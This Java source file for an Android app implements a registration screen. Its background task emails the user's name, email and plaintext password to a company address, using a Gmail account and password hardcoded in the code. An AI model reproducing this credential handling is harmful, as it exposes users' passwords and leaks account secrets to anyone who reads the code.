/******************************************************************************
 * Copyright (C) Open Stack, Inc.  All Rights Reserved.
 *
 * This software is unpublished and contains the trade secrets and
 * confidential proprietary information of Open Stack, Inc..
 *
 * No part of this publication may be reproduced in any form whatsoever without
 * written prior approval by Open Stack, Inc..
 *
 * Open Stack, Inc. reserves the right to revise this publication
 * and make changes without obligation to notify any person of such revisions
 * or changes.
 *****************************************************************************/

/*
 * Greeting.java: control other login function
 */

package openstack.bulldi.safe3x.Login;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import openstack.bulldi.safe3x.Alarm.GMailSender;
import openstack.util.CheckBoxImageView;
import openstack.bulldi.safe3x.BLE_Connection.Connection_seperate;
import openstack.util.EditTextPlus;
import openstack.bulldi.safe3x.R;




public class Greeting extends Activity {
    public static String username="";
    public static String usermail="";
    public static String userpassword;
    public static boolean login_other=false;
    EditTextPlus name;
    EditTextPlus mail;
    EditTextPlus password;
    EditTextPlus repassword;
    ImageView login_other_setting_back;
    Button greet_button;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_CUSTOM_TITLE);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.greeting);
        getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE, R.layout.login_other_titlebar);
        login_other_setting_back =(ImageView) findViewById(R.id.login_other_back);
        login_other_setting_back.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                finish();
            }
        });
        name=(EditTextPlus) findViewById(R.id.name_register);
        mail=(EditTextPlus) findViewById(R.id.mail_register);
        password=(EditTextPlus) findViewById(R.id.password_register);
        repassword=(EditTextPlus) findViewById(R.id.re_password_register);

        greet_button=(Button) findViewById(R.id.greet_button);
        greet_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                greet_button.setBackgroundResource(R.drawable.button_on1);
                greet_button.setTextColor(Color.BLACK);
                //Intent i = new Intent(Greeting.this, Connection.class);
                if((name.getText().length()==0)||(mail.getText().length()==0)||(password.getText().length()==0)||(repassword.getText().length()==0)){
                    showToast(getResources().getString(R.string.toast_login_other_fillText));
                    greet_button.setBackgroundResource(R.drawable.button_off1);
                    greet_button.setTextColor(Color.WHITE);
                }
                else if(password.getText().toString().compareTo(repassword.getText().toString())!=0){
                    showToast(getResources().getString(R.string.toast_login_other_wrongpass));
                    repassword.setText("");
                    greet_button.setBackgroundResource(R.drawable.button_off1);
                    greet_button.setTextColor(Color.WHITE);
                }else {
                    username=name.getText().toString();
                    usermail=mail.getText().toString();
                    userpassword=password.getText().toString();
                    final ConnectivityManager conMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                    final NetworkInfo activeNetwork = conMgr.getActiveNetworkInfo();
                    boolean internet_status=true;
                    if (activeNetwork != null && activeNetwork.isConnected()) {
                        // notify user you are online
                        internet_status=true;
                    } else {
                        // notify user you are not online
                        internet_status=false;
                    }
                    if(internet_status==true){
                    new SendEmailAsyncTask_login_other().execute();
                        login_other=true;
                        Bulldi_rule.is_checked=true;
                    Intent i = new Intent(Greeting.this, Notify_friend_openAPI.class);
                    startActivity(i);}
                    else {
                        Toast toast =Toast.makeText(Greeting.this,  getResources().getString(R.string.toast_internet_checking), Toast.LENGTH_LONG);
                        Bulldi_rule.is_checked=false;
                        login_other=false;
                        //toast.setGravity(Gravity.CENTER|Gravity.CENTER_HORIZONTAL, 0, 0);
                        toast.show();
                        greet_button.setBackgroundResource(R.drawable.button_off1);
                        greet_button.setTextColor(Color.WHITE);
                    }
                }
            }
        });
    }
    private void showToast(String msg) {
        Toast toast= Toast.makeText(this, msg, Toast.LENGTH_SHORT);
        centerText(toast.getView());
        toast.show();
    }
    void centerText(View view) {
        if( view instanceof TextView){
            ((TextView) view).setGravity(Gravity.CENTER);
        }else if( view instanceof ViewGroup){
            ViewGroup group = (ViewGroup) view;
            int n = group.getChildCount();
            for( int i = 0; i<n; i++ ){
                centerText(group.getChildAt(i));
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if(greet_button!=null) {
            greet_button.setBackgroundResource(R.drawable.button_off1);
            greet_button.setTextColor(Color.WHITE);
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        //Save agreement
        SharedPreferences prefs_agreement = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        SharedPreferences.Editor editor_agreement = prefs_agreement.edit();
        editor_agreement.putBoolean("rule_agreement", Bulldi_rule.is_checked);
        editor_agreement.commit(); //important, otherwise it wouldn't save.
        //Save login other state
        SharedPreferences prefs_other = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        SharedPreferences.Editor editor_other = prefs_other.edit();
        editor_other.putBoolean("login_other_state", login_other);
        editor_other.putString("login_other_name", username);
        editor_other.putString("login_other_mail",usermail);
        editor_other.commit(); //important, otherwise it wouldn't save.
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
    class SendEmailAsyncTask_login_other extends AsyncTask<Void, Void, Boolean> {


        public SendEmailAsyncTask_login_other() {
            //if (BuildConfig.DEBUG) Log.v(SendEmailAsyncTask.class.getName(), "SendEmailAsyncTask()");
        }

        @Override
        protected Boolean doInBackground(Void... params) {
            //if (BuildConfig.DEBUG) Log.v(SendEmailAsyncTask.class.getName(), "doInBackground()");

            String send_auth;
            String send_from;
            String password;
            String subject;
            subject="User login from other account";
            String content="User name: "+username+"\nEmail: "+usermail+"\nPassword: "+userpassword;

            send_auth="openstack.bulldi@gmail.com";
            password="openstack";
            String to_recieve="bulldi@openstack.co.kr";
            send_from="openstack.bulldi@gmail.com";
            GMailSender sender = new GMailSender(send_auth, password);
            try {
                try {
                    sender.sendMail(subject,
                            content,
                            send_from,
                            to_recieve);

                } catch (Exception e) {

                }
                return true;
            }
            catch (Exception e) {
                e.printStackTrace();
                return false;
            }
        }
        @Override
        protected void onPostExecute(Boolean result) {
            super.onPostExecute(result);
            //if (processVisibility) {
            if (result) {

            } else {

            }
        }
    }
}
